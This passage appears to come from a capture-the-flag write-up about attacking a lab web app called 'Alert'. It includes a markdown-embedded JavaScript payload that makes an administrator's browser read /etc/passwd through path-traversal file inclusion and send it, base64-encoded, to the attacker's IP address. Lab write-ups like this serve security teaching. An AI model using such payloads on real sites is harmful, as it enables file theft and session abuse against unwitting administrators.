# XXS

But going back to the main attack, let’s try some basic cookie stealing since the about section says:

```shell
Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!
```

We get a callback:

…but it looks like some sanitization is happening. After many tries, cookie stealing ultimately became a dead end.

However, the website is still vulnerable to blind XSS since we got a callback. Considering there is a markdown page, we can attempt to use markdown and see if the parser blocks XSS.

Since there is a `file` parameter getting included, we might be able to attempt file inclusion through the XSS. Let’s write some code.

```md
<script>
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/passwd',
false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.30/?content=' + btoa(req.responseText),
true);
req2.send();
</script>
```

What this does is send a request from the admin’s browser (victim context), exploiting the LFI for `/etc/passwd`. Then the response is sent back to us.
